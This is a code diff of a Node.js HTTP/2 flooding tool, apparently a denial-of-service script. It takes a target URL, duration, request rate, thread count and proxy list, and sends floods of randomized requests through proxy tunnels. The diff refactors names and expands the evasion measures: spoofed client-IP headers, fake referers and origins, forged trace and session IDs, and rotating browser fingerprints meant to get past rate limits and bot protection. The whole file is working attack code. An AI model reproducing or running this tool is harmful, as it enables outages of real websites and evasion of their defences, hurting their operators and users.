@@ -5,28 +5,32 @@ const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
-const UserAgent = require('user-agents');
+const UserAgent = require("user-agents");
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
-process.on('uncaughtException', function (exception) {});
+process.on("uncaughtException", () => {});
 
-if (process.argv.length < 7) { console.log(`Usage: target time rate thread proxyfile`); process.exit(); }
+if (process.argv.length < 7) {
+    console.log("Usage: target time rate threads proxyFile");
+    process.exit();
+}
 
 const headers = {};
+
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
-function randomIntn(min, max) {
+function randomInt(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
-    return elements[randomIntn(0, elements.length)];
+    return elements[randomInt(0, elements.length)];
 }
 
-function randstr(length) {
+function randomString(length) {
     const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
     let result = "";
     const charactersLength = characters.length;
@@ -36,79 +40,87 @@ function randstr(length) {
     return result;
 }
 
+function randomIp() {
+    return `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}`;
+}
+
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
-    Rate: parseInt(process.argv[4]),
+    rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 };
 
-const sig = [
-    'ecdsa_secp256r1_sha256',
-    'rsa_pkcs1_sha384',
-    'rsa_pkcs1_sha512',
-    'hmac_sha256',
-    'ecdsa_secp384r1_sha384',
-    'rsa_pkcs1_sha1',
-    'hmac_sha1'
+const signatureAlgorithms = [
+    "ecdsa_secp256r1_sha256",
+    "rsa_pkcs1_sha384",
+    "rsa_pkcs1_sha512",
+    "hmac_sha256",
+    "ecdsa_secp384r1_sha384",
+    "rsa_pkcs1_sha1",
+    "hmac_sha1"
 ];
 
-const accept_header = [
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    '*/*',
-    'image/*',
-    'image/webp,image/apng',
-    'text/html',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'application/json',
-    'application/xml',
-    'application/pdf',
-    'text/css',
-    'application/javascript'
+const acceptHeaders = [
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "*/*",
+    "image/*",
+    "image/webp,image/apng",
+    "text/html",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+    "application/json",
+    "application/xml",
+    "application/pdf",
+    "text/css",
+    "application/javascript"
 ];
 
-const lang_header = [
-    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-    'ko-KR',
-    'en-US',
-    'zh-CN',
-    'zh-TW',
-    'en-ZA',
-    'fr-FR',
-    'ja-JP',
-    'ar-EG',
-    'de-DE',
-    'es-ES'
+const languageHeaders = [
+    "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
+    "ko-KR",
+    "en-US",
+    "zh-CN",
+    "zh-TW",
+    "en-ZA",
+    "fr-FR",
+    "ja-JP",
+    "ar-EG",
+    "de-DE",
+    "es-ES"
 ];
 
-const encoding_header = [
-    'gzip, deflate, br',
-    'deflate',
-    'gzip, deflate, lzma, sdch',
-    'identity',
-    'compress',
-    'br'
+const encodingHeaders = [
+    "gzip, deflate, br",
+    "deflate",
+    "gzip, deflate, lzma, sdch",
+    "identity",
+    "compress",
+    "br"
 ];
 
 const methods = [
-    "GET", "HEAD", "POST", "DELETE", "PATCH"
+    "GET",
+    "HEAD",
+    "POST",
+    "DELETE",
+    "PATCH"
 ];
 
-const cache_control = [
-    'max-age=0',
-    'no-cache',
-    'no-store',
-    'must-revalidate'
+const cacheControlHeaders = [
+    "max-age=0",
+    "no-cache",
+    "no-store",
+    "must-revalidate"
 ];
 
-const sec_ch_ua = [
+const secChUaHeaders = [
     '"Chromium";v="137", "Not/A)Brand";v="24"',
     '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
     '"Microsoft Edge";v="137", "Chromium";v="137", "Not/A)Brand";v="24"'
 ];
 
-const sec_ch_ua_platform = [
+const secChUaPlatformHeaders = [
     "Linux",
     "Windows",
     "macOS",
@@ -116,12 +128,56 @@ const sec_ch_ua_platform = [
     "iOS"
 ];
 
-const rateHeaders = [
-    { "akamai-origin-hop": randstr(12) },
-    { "proxy-client-ip": randstr(12) },
-    { "via": randstr(12) },
-    { "cluster-ip": randstr(12) },
-    { "user-agent": randstr(12) }
+const dynamicHeaders = [
+    { "x-forwarded-for": () => randomIp() },
+    { "x-real-ip": () => randomIp() },
+    { "x-client-ip": () => randomIp() },
+    { "cf-connecting-ip": () => randomIp() },
+    { "x-forwarded-host": () => parsedTarget.host },
+    { "x-forwarded-proto": () => randomElement(["https", "http"]) },
+    { "x-frame-options": () => randomElement(["DENY", "SAMEORIGIN"]) },
+    { "referer": () => `https://${randomString(5)}.com/${randomString(8)}` },
+    { "origin": () => `https://${randomString(5)}.com` },
+    { "via": () => randomString(12) },
+    { "akamai-origin-hop": () => randomString(12) },
+    { "cluster-ip": () => randomString(12) },
+    { "x-request-id": () => randomString(16) },
+    { "x-correlation-id": () => randomString(16) },
+    { "x-device-id": () => randomString(20) },
+    { "x-session-token": () => randomString(32) },
+    { "pragma": () => randomElement(["no-cache", "max-age=0"]) },
+    { "dnt": () => randomElement(["0", "1"]) },
+    { "x-cache-status": () => randomElement(["hit", "miss", "bypass"]) },
+    { "x-browser-id": () => randomString(16) },
+    { "x-app-version": () => `${randomInt(1, 5)}.${randomInt(0, 9)}.${randomInt(0, 9)}` },
+    { "x-custom-header": () => randomString(10) },
+    { "x-trace-id": () => randomString(24) },
+    { "x-geo-location": () => randomElement(["US", "EU", "ASIA", "AU"]) },
+    { "x-user-session": () => randomString(20) },
+    { "x-api-key": () => randomString(32) },
+    { "x-request-timestamp": () => Date.now().toString() },
+    { "x-csrf-token": () => randomString(16) },
+    { "x-forwarded-port": () => randomElement(["80", "443", "8080"]) },
+    { "x-originating-ip": () => randomIp() },
+    { "x-remote-ip": () => randomIp() },
+    { "x-cloud-trace-context": () => `${randomString(16)}/${randomInt(1000, 9999)}` },
+    { "x-amzn-trace-id": () => `Root=1-${randomString(8)}-${randomString(24)}` },
+    { "x-forwarded-server": () => randomString(10) },
+    { "x-http-method-override": () => randomElement(methods) },
+    { "x-ua-compatible": () => "IE=edge" },
+    { "x-dns-prefetch-control": () => randomElement(["on", "off"]) },
+    { "x-download-options": () => "noopen" },
+    { "x-content-type-options": () => "nosniff" },
+    { "x-xss-protection": () => randomElement(["0", "1; mode=block"]) },
+    { "x-powered-by": () => randomString(10) },
+    { "x-server-id": () => randomString(12) },
+    { "x-client-session": () => randomString(20) },
+    { "x-request-origin": () => `https://${randomString(5)}.com` },
+    { "x-session-id": () => randomString(24) },
+    { "x-transaction-id": () => randomString(20) },
+    { "x-client-version": () => `${randomInt(1, 5)}.${randomInt(0, 9)}` },
+    { "x-environment": () => randomElement(["production", "staging", "development"]) },
+    { "x-region": () => randomElement(["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"]) }
 ];
 
 const proxies = readLines(args.proxyFile);
@@ -132,10 +188,10 @@ if (cluster.isMaster) {
         cluster.fork();
     }
     console.clear();
-    console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
-    console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
-    console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
-    console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
+    console.log(`\x1b[1m\x1b[34mTarget: \x1b[0m\x1b[1m${parsedTarget.host}\x1b[0m`);
+    console.log(`\x1b[1m\x1b[33mDuration: \x1b[0m\x1b[1m${args.time}\x1b[0m`);
+    console.log(`\x1b[1m\x1b[32mThreads: \x1b[0m\x1b[1m${args.threads}\x1b[0m`);
+    console.log(`\x1b[1m\x1b[31mRequests per second: \x1b[0m\x1b[1m${args.rate}\x1b[0m`);
 } else {
     setInterval(runFlooder);
 }
@@ -143,8 +199,8 @@ if (cluster.isMaster) {
 class NetSocket {
     constructor() {}
 
-    HTTP(options, callback) {
-        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+    httpRequest(options, callback) {
+        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
         const buffer = new Buffer.from(payload);
 
         const connection = net.connect({
@@ -163,7 +219,7 @@ class NetSocket {
         connection.on("data", chunk => {
             const response = chunk.toString("utf-8");
             const isAlive = response.includes("HTTP/1.1 200");
-            if (isAlive === false) {
+            if (!isAlive) {
                 connection.destroy();
                 return callback(undefined, "error: invalid response from proxy server");
             }
@@ -177,33 +233,33 @@ class NetSocket {
 
         connection.on("error", error => {
             connection.destroy();
-            return callback(undefined, "error: " + error);
+            return callback(undefined, `error: ${error}`);
         });
     }
 }
 
 function generateUserAgent() {
     const userAgent = new UserAgent({
-        deviceCategory: randomElement(['desktop', 'mobile', 'tablet']),
-        platform: randomElement(['Win32', 'MacIntel', 'Linux x86_64', 'iPhone', 'Android'])
+        deviceCategory: randomElement(["desktop", "mobile", "tablet"]),
+        platform: randomElement(["Win32", "MacIntel", "Linux x86_64", "iPhone", "Android"])
     });
     return userAgent.toString();
 }
 
-const Socker = new NetSocket();
+const socket = new NetSocket();
 
 headers[":method"] = randomElement(methods);
 headers[":authority"] = parsedTarget.host;
-headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
+headers[":path"] = parsedTarget.path + "?" + randomString(10) + "=" + randomString(5);
 headers[":scheme"] = "https";
 headers["user-agent"] = generateUserAgent();
-headers["accept"] = randomElement(accept_header);
-headers["accept-encoding"] = randomElement(encoding_header);
-headers["accept-language"] = randomElement(lang_header);
-headers["cache-control"] = randomElement(cache_control);
-headers["sec-ch-ua"] = randomElement(sec_ch_ua);
+headers["accept"] = randomElement(acceptHeaders);
+headers["accept-encoding"] = randomElement(encodingHeaders);
+headers["accept-language"] = randomElement(languageHeaders);
+headers["cache-control"] = randomElement(cacheControlHeaders);
+headers["sec-ch-ua"] = randomElement(secChUaHeaders);
 headers["sec-ch-ua-mobile"] = "?0";
-headers["sec-ch-ua-platform"] = randomElement(sec_ch_ua_platform);
+headers["sec-ch-ua-platform"] = randomElement(secChUaPlatformHeaders);
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "none";
@@ -222,32 +278,32 @@ function runFlooder() {
         timeout: 15
     };
 
-    Socker.HTTP(proxyOptions, (connection, error) => {
+    socket.httpRequest(proxyOptions, (connection, error) => {
         if (error) {
-            connection.close();
-            connection.destroy();
+            connection?.close();
+            connection?.destroy();
             return;
         }
 
         const tlsOptions = (() => {
-            const useTlsOption2 = (Math.random() < 0.5);
+            const useTlsOption2 = Math.random() < 0.5;
             return useTlsOption2 ?
                 {
                     secure: true,
-                    ALPNProtocols: ['h2'],
-                    sigals: randomElement(sig),
+                    ALPNProtocols: ["h2"],
+                    sigals: randomElement(signatureAlgorithms),
                     socket: connection,
-                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
-                    ecdhCurve: 'P-256:P-384',
+                    ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
+                    ecdhCurve: "P-256:P-384",
                     host: parsedTarget.host,
                     servername: parsedTarget.host,
                     rejectUnauthorized: false
                 } :
                 {
                     secure: true,
-                    ALPNProtocols: ['h2'],
-                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
-                    ecdhCurve: 'auto',
+                    ALPNProtocols: ["h2"],
+                    ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
+                    ecdhCurve: "auto",
                     rejectUnauthorized: false,
                     servername: parsedTarget.host,
                     secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
@@ -277,17 +333,19 @@ function runFlooder() {
         });
 
         client.on("connect", () => {
-            const IntervalAttack = setInterval(() => {
-                const dynHeaders = {
-                    ...headers,
-                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
-                };
-                for (let i = 0; i < args.Rate; i++) {
-                    const request = client.request(dynHeaders);
-                    request.on("response", response => {
+            const intervalAttack = setInterval(() => {
+                const selectedHeaders = dynamicHeaders.slice(0, randomInt(10, 20)); // Randomly select 10-20 headers
+                const requestHeaders = {...headers};
+                selectedHeaders.forEach(header => {
+                    const key = Object.keys(header)[0];
+                    const value = typeof header[key] === "function" ? header[key]() : header[key];
+                    requestHeaders[key] = value;
+                });
+                for (let i = 0; i < args.rate; i++) {
+                    const request = client.request(requestHeaders);
+                    request.on("response", () => {
                         request.close();
                         request.destroy();
-                        return;
                     });
                     request.end();
                 }
@@ -296,10 +354,8 @@ function runFlooder() {
 
         client.on("close", () => {
             client.destroy();
-            return;
         });
     });
 }
 
-const killer = () => process.exit(1);
-setTimeout(killer, args.time * 1000);
+setTimeout(() => process.exit(1), args.time * 1000);
